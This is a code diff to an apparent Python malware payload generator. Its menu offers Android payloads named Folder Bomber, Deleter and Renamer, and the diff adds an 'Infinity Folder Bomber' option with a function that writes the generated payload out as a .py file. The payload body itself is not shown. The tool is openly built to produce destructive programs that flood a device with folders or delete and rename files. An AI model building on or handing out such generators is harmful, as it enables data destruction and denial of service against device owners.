@@ -50,6 +50,7 @@ def androidpayloads():
     print('[2] Folder Bomber')
     print('[3] Deleter')
     print('[4] Renamer')
+    print('[5] Infinity Folder Bomber')
     print('[00] Return to Main Menu ')
     print()
     choice = input('Enter your choice : ')
@@ -61,6 +62,8 @@ def androidpayloads():
         Create_payloadTHREE()
     elif choice == '4':
         Create_payloadFOUR()
+    elif choice == '5':
+        Create_payloadFive()
     elif choice == '00':
         menu()
     else:
@@ -157,6 +160,25 @@ def Create_payloadFOUR():
                 print(Style.RESET_ALL)
     except FileExistsError as e:
         print(e)
+
+
+def Create_payloadFive():
+    file_name = input('[+] Enter file_name : ')
+    ENGINE = androidpayloadengine()
+    try:
+        with open(file_name+'.py' , 'w') as file:
+            file.write(ENGINE.infinity_bomber())
+            file.close()
+            if os.path.isfile(file_name + '.py'):
+                print(Fore.GREEN+f'[+] Successfully Generated : {file_name}.py')
+                print(Style.RESET_ALL)
+            else:
+                print(Fore.RED+'[!] Failed!')
+                print(Style.RESET_ALL)
+    except FileExistsError as e:
+        print(e)
+
+
 
 def Create_Win_payloadONE():
     print()
